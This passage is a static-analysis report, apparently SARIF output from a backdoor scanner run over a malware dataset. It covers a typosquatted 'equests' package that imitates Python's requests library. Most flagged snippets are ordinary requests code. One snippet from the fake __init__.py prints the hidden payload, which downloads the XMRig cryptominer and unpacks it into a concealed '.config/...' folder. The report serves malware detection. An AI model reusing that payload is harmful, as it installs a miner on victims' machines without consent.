                      "text": "Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n",
                      "markdown": "`Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/__init__.py"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 2,
                  "endLine": 37,
                  "endColumn": 6,
                  "snippet": {
                    "text": "   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n",
                    "rendered": {
                      "text": "   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n",
                      "markdown": "`   }\n\nThe other HTTP methods are supported - see `requests.api`. Full documentation\nis at <https://requests.readthedocs.io>.\n\n:copyright: (c) 2017 by Kenneth Reitz.\n:license: Apache 2.0, see LICENSE for more details.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/__init__.py"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 3,
                  "endLine": 164,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n",
                    "rendered": {
                      "text": "    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n",
                      "markdown": "`    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/compat.py"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 87,
                  "endLine": 64,
                  "endColumn": 103,
                  "snippet": {
                    "text": "\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n",
                    "rendered": {
                      "text": "\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n",
                      "markdown": "`\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/compat.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 35,
                  "endLine": 45,
                  "endColumn": 51,
                  "snippet": {
                    "text": "if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n",
                    "rendered": {
                      "text": "if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n",
                      "markdown": "`if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 606,
                  "startColumn": 4,
                  "endLine": 606,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n",
                    "rendered": {
                      "text": "\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n",
                      "markdown": "`\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 59,
                  "endLine": 857,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 31,
                  "endLine": 857,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 851,
                  "startColumn": 22,
                  "endLine": 851,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n",
                    "rendered": {
                      "text": "    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n",
                      "markdown": "`    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 820,
                  "startColumn": 51,
                  "endLine": 820,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                    "rendered": {
                      "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                      "markdown": "`    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 820,
                  "startColumn": 22,
                  "endLine": 820,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                    "rendered": {
                      "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                      "markdown": "`    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 57,
                  "endLine": 746,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 36,
                  "endLine": 746,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 726,
                  "startColumn": 30,
                  "endLine": 726,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                    "rendered": {
                      "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                      "markdown": "`    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 522,
                  "startColumn": 26,
                  "endLine": 522,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n",
                    "rendered": {
                      "text": "    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n",
                      "markdown": "`    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 27,
                  "endLine": 182,
                  "endColumn": 32,
                  "snippet": {
                    "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                    "rendered": {
                      "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                      "markdown": "`def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 57,
                  "endLine": 998,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n",
                    "rendered": {
                      "text": "    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n",
                      "markdown": "`    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 991,
                  "startColumn": 13,
                  "endLine": 991,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n",
                    "rendered": {
                      "text": "\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n",
                      "markdown": "`\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 38,
                  "endLine": 222,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n",
                    "rendered": {
                      "text": "        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n",
                      "markdown": "`        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 16,
                  "endLine": 857,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 855,
                  "startColumn": 8,
                  "endLine": 855,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n",
                    "rendered": {
                      "text": "    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n",
                      "markdown": "`    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 29,
                  "endLine": 746,
                  "endColumn": 61,
                  "snippet": {
